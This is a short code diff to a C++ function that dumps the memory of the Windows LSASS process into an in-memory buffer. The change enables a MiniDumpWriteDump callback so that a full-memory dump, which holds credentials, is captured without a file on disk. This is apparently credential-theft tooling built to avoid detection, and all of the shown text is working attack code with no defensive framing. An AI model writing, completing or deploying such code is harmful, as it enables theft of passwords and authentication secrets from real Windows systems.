@@ -157,8 +157,8 @@ bool DumpLsassToMemoryBuffer(std::vector<BYTE>& outputBuffer) {
         return false;
     }
 
-    // MINIDUMP_CALLBACK_INFORMATION callbackInfo = {};
-    // callbackInfo.CallbackRoutine = MiniDumpCallback;
+    MINIDUMP_CALLBACK_INFORMATION callbackInfo = {};
+    callbackInfo.CallbackRoutine = MiniDumpCallback;
 
     MINIDUMP_TYPE dumpType = (MINIDUMP_TYPE)(
         MiniDumpWithFullMemory |
@@ -177,7 +177,7 @@ bool DumpLsassToMemoryBuffer(std::vector<BYTE>& outputBuffer) {
         dumpType,
         NULL,
         NULL,
-        NULL
+        &callbackInfo
     );
 
     if (!result) {
@@ -215,7 +215,7 @@ bool DumpLsassToMemoryBuffer(std::vector<BYTE>& outputBuffer) {
 
     // Cleanup
     FreeLibrary(hDbgHelp);
-    CloseHandle(hFile);      
+    CloseHandle(hFile);
     CloseHandle(hLsass);
 
     return true;
